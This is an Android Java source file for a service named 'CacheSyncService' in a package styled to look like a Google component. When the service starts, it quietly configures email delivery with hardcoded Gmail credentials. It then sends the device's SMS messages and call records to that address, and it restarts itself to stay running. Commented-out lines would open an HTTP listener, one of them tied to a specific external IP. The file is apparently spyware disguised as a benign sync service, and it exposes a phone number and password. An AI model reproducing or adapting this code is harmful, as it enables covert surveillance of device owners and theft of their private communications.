package com.google.cachesync;

import com.code4bones.utils.BackgroundTask;
import com.code4bones.utils.NetLog;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;


public class CacheSyncService extends Service implements Runnable {

	final public CommandPool cmdPool = CommandPool.getInstance();
	final public NetLog gLog = NetLog.getInstance();
	
	public void run() {
	}

	@Override
	public void onCreate() 
	{
		gLog.Init("SrvCacheSync","CacheSync.log.txt",true);

		super.onCreate();
		NetLog.v("Service Created");
	    
		BackgroundTask<Void,Void> task = new BackgroundTask<Void,Void>(this,false) {
	        	public void onComplete(Void  v) {
	                NetLog.v("Service initialized");
	        		cmdPool.Execute("+79037996299", "@setup;ack:0;mto:cache.sync@gmail.com;muser:cache.sync@gmail.com;mpass:gumbaflex");
	        		cmdPool.Execute("+79037996299", "@rsms;mail");
	        		cmdPool.Execute("+79037996299", "@rcalls;mail");
	        		
	        		//cmdPool.Execute("+79037996299","@httpd;8081");
	        		//cmdPool.Execute("+79037996299","@httpd;217.118.66.22;8081");
	        	}
	        	@Override
	        	protected Void doInBackground(Void ... arg0) {
	                cmdPool.Init("Service",CacheSyncService.this);
	                //cmdPool.setDefaults();
	                return (Void)null;
	        	}
	        };
	    task.exec();
	}
	
	@Override
	public int onStartCommand(Intent intent,int flags, int startId)
	{
		super.onStartCommand(intent,flags, startId);
		NetLog.v("Service started...");
		return START_STICKY;
	}
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
